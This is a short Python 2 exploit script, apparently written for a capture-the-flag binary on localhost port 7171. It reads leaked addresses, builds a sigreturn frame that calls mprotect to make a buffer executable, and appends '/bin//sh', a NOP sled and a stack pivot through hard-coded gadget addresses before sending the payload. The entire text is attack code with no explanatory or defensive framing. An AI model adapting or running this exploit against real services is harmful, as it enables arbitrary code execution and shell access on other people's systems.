from socket import create_connection
import struct
import string
from Frame import SigreturnFrame

# 0x080c2812: mov esp,ecx ; ret
# 0x0804e25f: "\x5c\xc3 <==> pop esp; ret"
# 0x0805ba31: "\x81\xec\x28\x01\x00\x00 <==> sub esp, 0x128"

all_letters = string.letters[26:]
ip = "localhost"

SIGRETURN_IND = 0x08048ee3
INT_80        = 0x08056650
POP_ESP_RET   = 0x0804e25f
MOV_ESP_ECX   = 0x080c2812
SUB_ESP_128   = 0x0805ba31

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection((ip, 7171))
buffer_address = recv_n_bytes(s, 4)
print repr(buffer_address)
buffer_address = struct.unpack("<I", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 4)
print repr(page)
page = struct.unpack("<I", page)[0]
print hex(page)


sploit = ""
sploit += struct.pack("<I", SIGRETURN_IND)
frame = SigreturnFrame(sane=False, nulls_allowed=True)

frame.set_regvalue("eax", 125)
frame.set_regvalue("ebx", buffer_address)
frame.set_regvalue("ecx", 4096)
frame.set_regvalue("edx", 0x7)
frame.set_regvalue("eip", INT_80)
frame.set_regvalue("esp", POP_ESP_RET)

sploit += frame.get_frame()
print len(frame.get_frame())

#sploit += "A" * 4 * 17
offset = len(sploit)
print ">>>", offset
sploit += "/bin//sh"
sploit += struct.pack("<I", 0x0)

sploit += "\x90" * (0x208 - len(sploit))
sploit += "B" * 4
sploit += struct.pack("<I", POP_ESP_RET)
sploit += struct.pack("<I", buffer_address)

print ">>>", len(sploit)
s.send(sploit)
